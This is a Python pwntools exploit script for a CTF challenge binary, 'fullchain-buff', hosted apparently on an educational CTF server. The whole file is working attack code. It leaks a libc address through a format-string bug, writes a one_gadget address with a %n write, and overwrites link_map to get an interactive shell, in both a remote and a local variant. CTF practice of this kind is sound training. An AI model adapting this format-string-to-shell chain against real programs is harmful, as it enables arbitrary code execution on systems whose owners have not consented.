#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('edu-ctf.zoolab.org', 30205)

    # leak libc
    r.sendlineafter('global or local > ', 'local')
    r.sendlineafter('read or write > ', 'write%23$p')
    libc = int(r.recvuntil('global or local', drop=True)[-14:], 16) - 0x270b3
    one_shot = libc + 0xe6f31
    """
    0xe6f31: rax == NULL || [rax] == NULL
    """
    info(f"libc: {hex(libc)}")
    info(f"one_shot: {hex(one_shot)}")

    # write one_gadget
    r.sendlineafter(' > ', 'global')
    r.sendlineafter('read or write > ', 'read')
    r.sendlineafter('length > ', '22')
    r.send(b'%688c%42$nAAAAAA' + p64(one_shot)[:6])

    # overwrite link_map
    r.sendlineafter('global or local > ', 'global')
    r.sendlineafter('read or write > ', 'write')
    r.interactive()

else:
    r = process('./fullchain-buff')

    # leak libc
    r.sendlineafter('global or local > ', 'local')
    r.sendlineafter('read or write > ', 'write%21$p')
    libc = int(r.recvuntil('global or local', drop=True)[-14:], 16) - 0x270b3
    one_shot = libc + 0xe6f31
    """
    0xe6f31: rax == NULL || [rax] == NULL
    """
    info(f"libc: {hex(libc)}")
    info(f"one_shot: {hex(one_shot)}")

    # write one_gadget
    r.sendlineafter(' > ', 'global')
    r.sendlineafter('read or write > ', 'read')
    r.sendlineafter('length > ', '22')
    r.send(b'%688c%40$nAAAAAA' + p64(one_shot)[:6])

    # overwrite link_map
    r.sendlineafter('global or local > ', 'global')
    r.sendlineafter('read or write > ', 'write')
    r.interactive()